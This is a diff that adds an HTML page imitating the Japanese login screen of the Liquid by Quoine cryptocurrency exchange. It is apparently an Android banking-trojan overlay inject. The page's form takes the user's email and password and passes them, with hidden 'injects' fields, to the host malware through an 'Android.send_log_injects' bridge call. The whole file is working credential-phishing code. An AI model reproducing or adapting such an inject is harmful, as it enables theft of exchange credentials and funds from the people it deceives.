@@ -1,0 +1,265 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Liquid by Quoineライト版（リキッドバイコイン） -ビットコインなどの仮想通貨取引所</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #eeeeee;
+    color: #cccccc;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    background: #ffffff;
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    padding: 18px 0;
+    text-align: left;
+    box-shadow: 0px 0px 7px #888888;
+}
+.logo {
+    margin: 0 auto;
+    text-align: center;
+    color: #000000;
+    font-weight: bold;
+    font-size: 1.2rem;
+    padding-left: 25px;
+}
+.main {
+    margin-top: 40px;
+}
+.autorizeBox {
+    background: #ffffff;
+    color: #cccccc;
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px #cccccc;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+    
+    .bottombtn {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #bebebe;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    font-size: 1.125rem;
+    background: 0 0;
+    border: none;
+    color: #000000;
+    border-bottom: 1px solid #ccc;
+    padding: 5px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.bottombtn {
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+.bottommagrin {
+    width: 100%;
+    bottom: 10px;
+    position: absolute;
+}
+.bottombtn .center {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.bottombtn a {
+    margin-bottom: 15px;
+    color: #818181;
+    display: block;
+    width: 100%;
+    text-align: center;
+}
+.bottombtn .atag {
+    text-decoration: none;
+    color: #cccccc;
+}
+.bottombtn .atag span {
+    color: #70b4ea;
+}
+.bottombtn button {
+    margin: 20px 0;
+    background-color: #ff4c67;
+    border: none;
+    width: 100%;
+    height: 2.5rem;
+    overflow-x: auto;
+    border-radius: 30px;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+}
+.bottombtn button:disabled,
+.bottombtn button[disabled] {
+    background-color: #bbbbbb;
+}
+.bottombtn button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #ffffff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+</style>
+<body>
+    <div class="header"><div class="logongardient">
+            <div class="logo">ログイン</div>
+        </div>
+    </div>
+    <div class="main">
+        <div class="autorizeBox">
+            <form id="login" action="" style="">
+                    <input id="Login" name="email" placeholder="メールアドレス" pattern=".{4,}" onkeypress="checkinputsemail(this.value.length);" onchange="checkinputsemail(this.value.length);" autocomplete="off" type="text" required>
+                    <input id="Password" name="password" placeholder="パスワード" pattern=".{4,}" onkeypress="checkinputspassword(this.value.length);" onchange="checkinputspassword(this.value.length);" autocomplete="off" type="password" required>
+                    <input name="type_injects" value='banks' type="hidden" required>
+                    <input name="closed" value='close_activity_injects' type="hidden" required>
+            </form>
+        </div>
+        <div class="bottombtn">
+            <div class="center">
+                <a href="#">パスワードを忘れた場合はコチラ</a>
+                <a class="atag" href="#">ログインできない場合のへルプセンターは<span>こちら</span></a>
+            </div>
+        </div>
+        <div class="bottommagrin">
+            <div class="bottombtn">
+                <div class="center">
+                    <button id="btnmybest" type="button" onclick="process('login')" disabled><span>ログイン</span></button>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<script>
+var emailinputs = false;
+var passwordinputs = false;
+
+document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
+
+function checkinputsemail(lentext) {
+    if(lentext > 4)
+    {
+        emailinputs = true;
+    }
+    document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
+}
+
+function checkinputspassword(lentext) {
+    if(lentext > 4)
+    {
+        passwordinputs = true;
+    }
+    document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
+}
+
+function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSONbyName(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
